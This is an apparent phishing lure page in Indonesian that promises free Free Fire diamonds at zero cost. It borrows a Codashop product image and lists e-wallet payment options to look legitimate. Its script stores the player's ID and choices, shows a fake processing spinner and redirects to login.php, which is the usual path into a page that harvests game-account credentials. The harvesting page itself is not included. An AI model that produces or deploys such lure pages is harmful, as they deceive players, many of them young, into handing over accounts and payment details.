<!-- Author By WirdGates -->
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TopUp Gratis - Free Fire</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="bg-gray-100 text-gray-800">
  <header class="bg-white shadow-md py-4 px-6 flex justify-between items-center">
    <h1 class="text-xl font-bold text-[#6242FC]">TopUp Gratis</h1>
    <span class="text-sm font-medium">Free Fire</span>
  </header>
  <main class="max-w-3xl mx-auto mt-8 bg-white p-6 md:p-10 rounded-xl shadow-lg">
    <div class="flex flex-col md:flex-row items-center gap-6 mb-6">
      <img src="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/free-fire-tile-codacash-new.jpg" alt="Free Fire" class="w-40 rounded-xl shadow">
      <div>
        <h2 class="text-xl font-semibold">Top-Up Free Fire</h2>
        <p class="text-sm text-gray-600 mt-2">Masukkan ID pemain, pilih jumlah diamond, dan bayar menggunakan metode favoritmu!</p>
      </div>
    </div>
    <label for="user-id" class="block text-sm font-semibold mb-1">Player ID</label>
    <input type="number" id="user-id" placeholder="Masukkan Player ID" class="w-full p-3 border rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-pink-400" />

    <!-- Diamond Selection -->
    <h2 class="font-semibold mt-6 mb-2">Pilih Diamond</h2>
    <div class="grid grid-cols-2 md:grid-cols-4 gap-4" id="diamond-options">
      <div class="card-option bg-white border-2 border-gray-300 rounded-lg p-4 text-center cursor-pointer hover:bg-pink-50 transition">100 Diamonds<br><span class="text-sm text-gray-500">Rp 0</span></div>
      <div class="card-option bg-white border-2 border-gray-300 rounded-lg p-4 text-center cursor-pointer hover:bg-pink-50 transition">250 Diamonds<br><span class="text-sm text-gray-500">Rp 0</span></div>
      <div class="card-option bg-white border-2 border-gray-300 rounded-lg p-4 text-center cursor-pointer hover:bg-pink-50 transition">500 Diamonds<br><span class="text-sm text-gray-500">Rp 0</span></div>
      <div class="card-option bg-white border-2 border-gray-300 rounded-lg p-4 text-center cursor-pointer hover:bg-pink-50 transition">1200 Diamonds<br><span class="text-sm text-gray-500">Rp 0</span></div>
    </div>

    <!-- Payment Selection -->
    <h2 class="font-semibold mt-6 mb-2">Pilih Pembayaran</h2>
    <div class="grid grid-cols-2 md:grid-cols-4 gap-4" id="payment-options">
      <div class="card-option bg-white border-2 border-gray-300 rounded-lg p-4 text-center cursor-pointer hover:bg-pink-50 transition">DANA</div>
      <div class="card-option bg-white border-2 border-gray-300 rounded-lg p-4 text-center cursor-pointer hover:bg-pink-50 transition">OVO</div>
      <div class="card-option bg-white border-2 border-gray-300 rounded-lg p-4 text-center cursor-pointer hover:bg-pink-50 transition">ShopeePay</div>
      <div class="card-option bg-white border-2 border-gray-300 rounded-lg p-4 text-center cursor-pointer hover:bg-pink-50 transition">GoPay</div>
    </div>

    <!-- Button -->
  <button id="buy-button" onclick="submitOrder()"
    class="mt-6 w-full bg-[#6242FC] hover:bg-[#5238d4] text-white font-semibold py-3 rounded-md flex justify-center items-center gap-2 transition disabled:opacity-50">
    <span id="buy-text">Beli Sekarang</span>
    <span id="buy-spinner" class="hidden"><i class="fas fa-spinner fa-spin"></i></span>
  </button>

    <div id="result" class="mt-4 text-sm font-semibold text-center"></div>
  </main>

  <!-- Footer -->
  <footer class="text-center text-gray-500 text-sm py-6">
    &copy; 2025 TopUp Gratis
  </footer>

  <script>
    let selectedDiamond = null;
    let selectedPayment = null;

    document.querySelectorAll('#diamond-options .card-option').forEach(card => {
      card.addEventListener('click', () => {
        document.querySelectorAll('#diamond-options .card-option').forEach(c => {
          c.classList.remove('border-pink-500', 'bg-pink-100', 'text-pink-700');
        });
        card.classList.add('border-pink-500', 'bg-pink-100', 'text-pink-700');
        selectedDiamond = card.innerText.split('\n')[0];
      });
    });

    document.querySelectorAll('#payment-options .card-option').forEach(card => {
      card.addEventListener('click', () => {
        document.querySelectorAll('#payment-options .card-option').forEach(c => {
          c.classList.remove('border-pink-500', 'bg-pink-100', 'text-pink-700');
        });
        card.classList.add('border-pink-500', 'bg-pink-100', 'text-pink-700');
        selectedPayment = card.innerText;
      });
    });

    function submitOrder() {
      const userId = document.getElementById('user-id').value.trim();
      const result = document.getElementById('result');
      const button = document.getElementById('buy-button');
      const text = document.getElementById('buy-text');
      const spinner = document.getElementById('buy-spinner');

      if (!userId || !selectedDiamond || !selectedPayment) {
        result.style.color = 'red';
        result.innerText = '❌ Mohon lengkapi semua.';
        return;
      }

      localStorage.setItem('playerId', userId);
      localStorage.setItem('diamond', selectedDiamond);
      localStorage.setItem('payment', selectedPayment);

      text.style.display = 'none';
      spinner.classList.remove('hidden');
      button.disabled = true;
      result.innerText = '';

      setTimeout(() => {
        window.location.href = "login.php";
      }, 1500);
    }
  </script>
</body>
</html>
